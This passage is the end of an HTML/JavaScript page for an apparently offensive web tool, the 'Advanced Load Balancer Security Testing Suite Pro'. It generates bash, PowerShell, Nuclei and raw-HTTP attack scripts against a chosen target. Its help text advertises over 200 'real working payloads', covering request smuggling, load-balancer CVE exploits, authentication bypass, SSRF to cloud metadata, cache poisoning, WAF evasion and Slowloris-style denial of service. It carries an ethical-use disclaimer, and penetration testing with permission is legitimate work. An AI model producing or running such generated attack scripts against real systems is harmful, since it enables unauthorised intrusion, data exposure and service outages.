                    script += `\n  --data-raw "${test.body.replace(/"/g, '\\"')}" \\`;
                }

                const fullUrl = url.origin + (test.path || '/');
                script += `
  -w "%{http_code}|%{time_total}|%{size_download}" \\
  -D "$headers_file" \\
  -o "$response_file" \\
  "${fullUrl}" > "$LOGDIR/test_${testNum}_metrics.txt" 2>&1

# Parse results
if [ -f "$LOGDIR/test_${testNum}_metrics.txt" ]; then
    metrics=$(cat "$LOGDIR/test_${testNum}_metrics.txt")
    status_code=$(echo "$metrics" | cut -d'|' -f1)
    response_time=$(echo "$metrics" | cut -d'|' -f2)
    response_size=$(echo "$metrics" | cut -d'|' -f3)
    
    status_emoji=$(get_status_emoji $status_code)
    echo -e "    $status_emoji Status: $status_code | Time: ${response_time}s | Size: $response_size bytes"
    
    # Check for interesting responses
    if [ "$status_code" = "200" ] && [ "${test.severity}" = "critical" ]; then
        echo -e "    ${RED}üö® CRITICAL: Test returned 200 OK!${NC}"
    elif [ "$status_code" = "403" ]; then
        echo -e "    ${YELLOW}üõ°Ô∏è  Access forbidden (endpoint exists)${NC}"
    elif [ "$status_code" -ge "500" ]; then
        echo -e "    ${RED}üí• Server error detected${NC}"
    fi
    
    # Log the result
    log_result "${test.name}" "$status_code" "$response_time" "${category}" "${test.severity}"
else
    echo -e "    ${RED}‚ùå Request failed${NC}"
    log_result "${test.name}" "ERROR" "0" "${category}" "${test.severity}"
fi

echo "---"
`;
            });

            script += `

echo ""
echo "=================================================="
echo -e "${GREEN}‚úÖ Security scan completed!${NC}"
echo -e "${CYAN}üìÅ Results directory: $LOGDIR/${NC}"

# Generate summary
echo ""
echo -e "${CYAN}üìä QUICK ANALYSIS:${NC}"

if [ -f "$LOGDIR/summary.txt" ]; then
    total_tests=$(wc -l < "$LOGDIR/summary.txt")
    http_200=$(grep -c "Status: 200" "$LOGDIR/summary.txt" || echo "0")
    http_403=$(grep -c "Status: 403" "$LOGDIR/summary.txt" || echo "0")
    http_500=$(grep -c "Status: 5[0-9][0-9]" "$LOGDIR/summary.txt" || echo "0")
    critical_200=$(grep "critical" "$LOGDIR/summary.txt" | grep -c "Status: 200" || echo "0")
    
    echo "   Total tests: $total_tests"
    echo "   HTTP 200 responses: $http_200"
    echo "   HTTP 403 responses: $http_403"
    echo "   HTTP 500+ errors: $http_500"
    
    if [ "$critical_200" -gt "0" ]; then
        echo -e "   ${RED}üö® Critical tests with 200 OK: $critical_200${NC}"
    fi
fi

# Count by severity
critical_tests=${tests.filter(t => t.test.severity === 'critical').length}
high_tests=${tests.filter(t => t.test.severity === 'high').length}
medium_tests=${tests.filter(t => t.test.severity === 'medium').length}
low_tests=${tests.filter(t => t.test.severity === 'low').length}

echo ""
echo -e "${CYAN}‚ö° SEVERITY BREAKDOWN:${NC}"
echo -e "   ${RED}üî¥ Critical: $critical_tests tests${NC}"
echo -e "   ${YELLOW}üü† High: $high_tests tests${NC}"
echo -e "   ${BLUE}üü° Medium: $medium_tests tests${NC}"
echo -e "   ${GREEN}üü¢ Low: $low_tests tests${NC}"

echo ""
echo -e "${PURPLE}üìã Files generated:${NC}"
echo "   ‚Ä¢ Summary: $LOGDIR/summary.txt"
echo "   ‚Ä¢ Individual responses: $LOGDIR/test_*_response.txt"
echo "   ‚Ä¢ Headers: $LOGDIR/test_*_headers.txt"

echo ""
echo -e "${GREEN}üéâ Scan completed successfully!${NC}"
`;

            return script;
        }

        // Generate PowerShell script
        function generatePowerShellScript(tests, targetUrl, proxyUrl) {
            const url = new URL(targetUrl);
            const targetHost = url.hostname;
            
            return `# Advanced Load Balancer Security Testing Script (PowerShell)
# Target: ${targetUrl}
# Generated: ${new Date().toISOString()}

param(
    [string]$TargetUrl = "${targetUrl}",
    [string]$ProxyUrl = "${proxyUrl || ''}",
    [int]$TimeoutSeconds = 30
)

# Configuration
$TargetHost = "${targetHost}"
$Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$LogDir = "lb_scan_$Timestamp"
$ResultsFile = "$LogDir\\results.json"

# Colors
$Colors = @{
    Red = "Red"
    Green = "Green"
    Yellow = "Yellow"
    Blue = "Blue"
    Magenta = "Magenta"
    Cyan = "Cyan"
    White = "White"
}

# Create results directory
New-Item -ItemType Directory -Path $LogDir -Force | Out-Null

# Initialize results
$Results = @{
    target = $TargetUrl
    timestamp = (Get-Date).ToString("o")
    tests = @()
}

Write-Host "‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó" -ForegroundColor Magenta
Write-Host "‚ïë                                                               ‚ïë" -ForegroundColor Magenta
Write-Host "‚ïë     üõ°Ô∏è  Advanced Load Balancer Security Scanner             ‚ïë" -ForegroundColor Magenta
Write-Host "‚ïë                                                               ‚ïë" -ForegroundColor Magenta
Write-Host "‚ïë     üéØ Target: $TargetUrl" -ForegroundColor Magenta
Write-Host "‚ïë     üìÖ Time:   $(Get-Date)" -ForegroundColor Magenta
Write-Host "‚ïë     üìÅ Output: $LogDir" -ForegroundColor Magenta
Write-Host "‚ïë                                                               ‚ïë" -ForegroundColor Magenta
Write-Host "‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù" -ForegroundColor Magenta

Write-Host ""
Write-Host "üöÄ Starting security assessment..." -ForegroundColor Cyan
Write-Host "üìä Total tests: ${tests.length}" -ForegroundColor Cyan
Write-Host "=================================================="

# Function to get status emoji
function Get-StatusEmoji {
    param($StatusCode)
    switch ($StatusCode) {
        200 { "‚úÖ" }
        401 { "üîê" }
        403 { "üö´" }
        404 { "‚ùì" }
        { $_ -ge 500 } { "üí•" }
        default { "‚ÑπÔ∏è" }
    }
}

# Function to get severity color
function Get-SeverityColor {
    param($Severity)
    switch ($Severity) {
        "critical" { $Colors.Red }
        "high" { $Colors.Yellow }
        "medium" { $Colors.Blue }
        "low" { $Colors.Green }
        default { $Colors.White }
    }
}

# Test execution function
function Invoke-SecurityTest {
    param(
        [string]$TestName,
        [string]$Category,
        [string]$Description,
        [string]$Method = "GET",
        [hashtable]$Headers = @{},
        [string]$Path = "/",
        [string]$Body = "",
        [string]$Severity = "medium"
    )
    
    $SeverityColor = Get-SeverityColor $Severity
    Write-Host "[$($Severity.ToUpper())] $TestName" -ForegroundColor $SeverityColor
    Write-Host "Description: $Description" -ForegroundColor Gray
    
    try {
        # Prepare headers
        $RequestHeaders = @{}
        foreach ($key in $Headers.Keys) {
            $value = $Headers[$key] -replace "TARGET", $TargetHost
            $RequestHeaders[$key] = $value
        }
        
        # Build URI
        $Uri = $TargetUrl.TrimEnd('/') + $Path
        
        $StartTime = Get-Date
        
        # Configure request parameters
        $RequestParams = @{
            Uri = $Uri
            Method = $Method
            Headers = $RequestHeaders
            TimeoutSec = $TimeoutSeconds
            UseBasicParsing = $true
        }
        
        if ($ProxyUrl) {
            $RequestParams.Proxy = $ProxyUrl
        }
        
        if ($Body) {
            $RequestParams.Body = $Body
        }
        
        # Execute request
        $Response = Invoke-WebRequest @RequestParams
        $ResponseTime = ((Get-Date) - $StartTime).TotalSeconds
        
        $StatusEmoji = Get-StatusEmoji $Response.StatusCode
        Write-Host "    $StatusEmoji Status: $($Response.StatusCode) | Time: $($ResponseTime.ToString('F3'))s | Size: $($Response.Content.Length) bytes" -ForegroundColor Green
        
        # Analyze response
        $Indicators = @()
        
        # Check for load balancer headers
        $LBHeaders = @('Server', 'Via', 'X-Powered-By', 'X-Load-Balancer', 'X-Backend-Server')
        foreach ($header in $LBHeaders) {
            if ($Response.Headers[$header]) {
                $Indicators += "$header: $($Response.Headers[$header])"
            }
        }
        
        # Check for critical findings
        if ($Response.StatusCode -eq 200 -and $Severity -eq "critical") {
            Write-Host "    üö® CRITICAL: Test returned 200 OK!" -ForegroundColor Red
        }
        
        if ($Indicators.Count -gt 0) {
            foreach ($indicator in $Indicators[0..2]) {
                Write-Host "      ‚Ä¢ $indicator" -ForegroundColor Yellow
            }
        }
        
        # Save response
        $Response.Content | Out-File "$LogDir\\test_$TestName.txt" -Encoding UTF8
        
        return @{
            test = $TestName
            category = $Category
            severity = $Severity
            status_code = $Response.StatusCode
            response_time = $ResponseTime
            indicators = $Indicators
            success = $true
        }
        
    } catch {
        Write-Host "    ‚ùå Error: $($_.Exception.Message)" -ForegroundColor Red
        
        return @{
            test = $TestName
            category = $Category
            severity = $Severity
            error = $_.Exception.Message
            success = $false
        }
    }
}

# Execute all tests
$TestResults = @()

${tests.map(({ category, test }, index) => {
    const headers = test.headers || {};
    const headersPS = Object.entries(headers).map(([k, v]) => `"${k}" = "${v}"`).join('; ');
    
    return `
# Test ${index + 1}: ${test.name}
Write-Host ""
Write-Host "[${index + 1}/${tests.length}] ${category}" -ForegroundColor Cyan
$TestResult = Invoke-SecurityTest -TestName "${test.name}" -Category "${category}" -Description "${test.description}" -Method "${test.method || 'GET'}" -Headers @{${headersPS}} -Path "${test.path || '/'}" -Body "${test.body || ''}" -Severity "${test.severity}"
$TestResults += $TestResult
Write-Host "---"`;
}).join('')}

# Generate summary
Write-Host ""
Write-Host "=================================================="
Write-Host "‚úÖ Security scan completed!" -ForegroundColor Green
Write-Host "üìÅ Results directory: $LogDir" -ForegroundColor Cyan

$TotalTests = $TestResults.Count
$SuccessfulTests = ($TestResults | Where-Object { $_.success }).Count
$FailedTests = $TotalTests - $SuccessfulTests

Write-Host ""
Write-Host "üìä SUMMARY:" -ForegroundColor Cyan
Write-Host "   Total tests: $TotalTests"
Write-Host "   Successful: $SuccessfulTests" -ForegroundColor Green
Write-Host "   Failed: $FailedTests" -ForegroundColor Red

# Severity breakdown
$SeverityCounts = $TestResults | Group-Object severity | ForEach-Object { @{$_.Name = $_.Count} }
Write-Host ""
Write-Host "‚ö° SEVERITY BREAKDOWN:" -ForegroundColor Cyan
Write-Host "   üî¥ Critical: ${tests.filter(t => t.test.severity === 'critical').length} tests" -ForegroundColor Red
Write-Host "   üü† High: ${tests.filter(t => t.test.severity === 'high').length} tests" -ForegroundColor Yellow
Write-Host "   üü° Medium: ${tests.filter(t => t.test.severity === 'medium').length} tests" -ForegroundColor Blue
Write-Host "   üü¢ Low: ${tests.filter(t => t.test.severity === 'low').length} tests" -ForegroundColor Green

# Save results
$Results.tests = $TestResults
$Results | ConvertTo-Json -Depth 10 | Out-File $ResultsFile -Encoding UTF8

Write-Host ""
Write-Host "üìÑ Results saved to: $ResultsFile" -ForegroundColor Green
Write-Host "üéâ Scan completed successfully!" -ForegroundColor Green
`;
        }

        // Generate Nuclei templates
        function generateNucleiTemplates(tests, targetUrl) {
            let templates = `# Nuclei Templates for Load Balancer Security Testing
# Target: ${targetUrl}
# Generated: ${new Date().toISOString()}
# Usage: nuclei -t lb-security-tests.yaml -u ${targetUrl}

`;

            tests.forEach(({ category, test }, index) => {
                const templateId = test.name.toLowerCase().replace(/[^a-z0-9]/g, '-');
                
                templates += `---
id: ${templateId}

info:
  name: "${test.name}"
  author: lb-security-suite
  severity: ${test.severity}
  description: "${test.description}"
  tags: load-balancer,${category.toLowerCase().replace(/[^a-z0-9]/g, '-')},${test.severity}

requests:
  - method: ${test.method || 'GET'}
    path:
      - "${test.path || '/'}"
    
    headers:`;

                if (test.headers) {
                    Object.entries(test.headers).forEach(([key, value]) => {
                        const headerValue = value.replace(/TARGET/g, '{{Hostname}}');
                        templates += `\n      ${key}: "${headerValue}"`;
                    });
                } else {
                    templates += `\n      User-Agent: "Nuclei-LoadBalancer-Scanner"`;
                }

                if (test.body) {
                    templates += `\n    
    body: |
      ${test.body}`;
                }

                templates += `

    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
          - 403
          - 500
      
      - type: word
        words:
          - "backend"
          - "server-id"
          - "load balancer"
          - "admin"
        condition: or
    
    extractors:
      - type: regex
        regex:
          - "Server: ([^\\r\\n]+)"
          - "X-Backend-Server: ([^\\r\\n]+)"
          - "Via: ([^\\r\\n]+)"
        group: 1

`;
            });

            return templates;
        }

        // Generate raw HTTP requests
        function generateRawHttp(tests, targetUrl) {
            const url = new URL(targetUrl);
            const targetHost = url.hostname;
            
            let requests = `# Raw HTTP Requests for Load Balancer Security Testing
# Target: ${targetUrl}
# Use with tools like netcat, telnet, or custom HTTP clients
# Generated: ${new Date().toISOString()}

`;

            tests.forEach(({ category, test }, index) => {
                requests += `# Test ${index + 1}: ${test.name}
# Category: ${category}
# Severity: ${test.severity.toUpperCase()}
# Description: ${test.description}

${test.method || 'GET'} ${test.path || '/'} HTTP/1.1
Host: ${targetHost}`;

                if (test.headers) {
                    Object.entries(test.headers).forEach(([key, value]) => {
                        const headerValue = value.replace(/TARGET/g, targetHost);
                        requests += `\n${key}: ${headerValue}`;
                    });
                }

                requests += `
User-Agent: LoadBalancer-Tester/2.0
Accept: */*
Connection: close`;

                if (test.body) {
                    requests += `\nContent-Length: ${test.body.length}\n\n${test.body}`;
                } else {
                    requests += `\n\n`;
                }

                requests += `${'='.repeat(70)}\n\n`;
            });

            return requests;
        }

        // Copy commands to clipboard with enhanced feedback
        function copyCommands() {
            const content = document.getElementById('outputContent').textContent;
            navigator.clipboard.writeText(content).then(() => {
                const btn = event.target.closest('button');
                const originalText = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-check mr-2"></i>Copied!';
                btn.classList.add('bg-green-100', 'text-green-700');
                
                // Show success animation
                btn.style.transform = 'scale(1.05)';
                setTimeout(() => {
                    btn.style.transform = '';
                    btn.innerHTML = originalText;
                    btn.classList.remove('bg-green-100', 'text-green-700');
                }, 2000);
            });
        }

        // Download commands with proper file extension
        function downloadCommands() {
            const content = document.getElementById('outputContent').textContent;
            const format = document.getElementById('outputFormat').value;
            const extensions = { 
                'curl-pure': 'txt',
                'python': 'py', 
                'python-async': 'py',
                'burp': 'txt',
                'bash': 'sh',
                'powershell': 'ps1',
                'nuclei': 'yaml',
                'raw': 'txt' 
            };
            const timestamp = new Date().getTime();
            const filename = `lb_security_tests_${format}_${timestamp}.${extensions[format]}`;
            
            const blob = new Blob([content], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            a.click();
            window.URL.revokeObjectURL(url);
        }

        // Close modal
        function closeModal() {
            document.getElementById('outputModal').classList.add('hidden');
        }

        // Enhanced help system
        function showHelp() {
            alert(`üõ°Ô∏è Advanced Load Balancer Security Testing Suite Pro

üéØ COMPREHENSIVE ATTACK VECTORS:
This tool generates real working payloads for professional penetration testing of load balancers.

üìã TEST CATEGORIES (200+ tests):
‚Ä¢ Load Balancer Fingerprinting - Identify F5, HAProxy, Nginx, AWS ALB, CloudFlare, Azure
‚Ä¢ Virtual Host Discovery - Find admin.*, api.*, internal.* virtual hosts  
‚Ä¢ Backend Server Enumeration - Enumerate internal servers and services
‚Ä¢ Request Smuggling - CL.TE, TE.CL, HTTP/2 downgrade attacks
‚Ä¢ Known CVE Exploits - F5 BIG-IP, Kemp LoadMaster, VMware Avi, Citrix NetScaler
‚Ä¢ Authentication Bypass - JWT attacks, ALBeast, method overrides
‚Ä¢ Host Header Injection - Cache poisoning, virtual host bypasses
‚Ä¢ Path Traversal & SSRF - Directory traversal, cloud metadata access
‚Ä¢ Cache Poisoning - Web cache deception, key poisoning
‚Ä¢ Session Management - Session fixation, sticky session attacks
‚Ä¢ SSL/TLS Attacks - SSL offloading bypass, SNI manipulation
‚Ä¢ Information Disclosure - Server status, backend enumeration
‚Ä¢ WebSocket Attacks - Upgrade hijacking, origin bypass
‚Ä¢ DoS & Resource Exhaustion - Slowloris, resource exhaustion
‚Ä¢ HTTP/2 Protocol Attacks - HTTP/2 specific vulnerabilities
‚Ä¢ XML & API Attacks - XXE, GraphQL, REST API attacks
‚Ä¢ gRPC & Protocol Attacks - gRPC metadata injection
‚Ä¢ Cloud & Container Attacks - Kubernetes, Docker, service mesh
‚Ä¢ Rate Limiting & WAF Bypass - Rate limit bypass, WAF evasion

‚ö° OUTPUT FORMATS:
‚Ä¢ Pure cURL - Clean curl commands chained with &&
‚Ä¢ Python Script - No-argument comprehensive scanner with colors
‚Ä¢ Python Async - High-performance concurrent testing
‚Ä¢ Burp Suite - Ready-to-import request templates
‚Ä¢ Bash Script - Full featured bash automation with colors
‚Ä¢ PowerShell - Windows PowerShell script
‚Ä¢ Nuclei Templates - YAML templates for Nuclei scanner
‚Ä¢ Raw HTTP - Pure HTTP requests for manual testing

üéØ KEY FEATURES:
‚Ä¢ 200+ real attack vectors across 18 categories
‚Ä¢ Load balancer fingerprinting for all major vendors
‚Ä¢ Comprehensive virtual host discovery
‚Ä¢ Backend server discovery and enumeration
‚Ä¢ Based on actual CVEs and documented vulnerabilities
‚Ä¢ Real-time statistics and analytics dashboard
‚Ä¢ Advanced filtering with search highlighting
‚Ä¢ No false positives - only working attack vectors
‚Ä¢ Professional-grade reporting and analysis

üîß ADVANCED FEATURES:
‚Ä¢ Interactive statistics dashboard with charts
‚Ä¢ Real-time filtering with active filter display
‚Ä¢ Search term highlighting
‚Ä¢ Category expansion/collapse
‚Ä¢ Animated selection feedback
‚Ä¢ Multiple preset configurations
‚Ä¢ Enhanced error handling and progress tracking

‚ö†Ô∏è ETHICAL USE ONLY:
Only test systems you own or have explicit written permission to test.

üìö For documentation and updates:
github.com/security-tools/advanced-lb-tester-pro`);
        }

        // Initialize on load
        document.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>
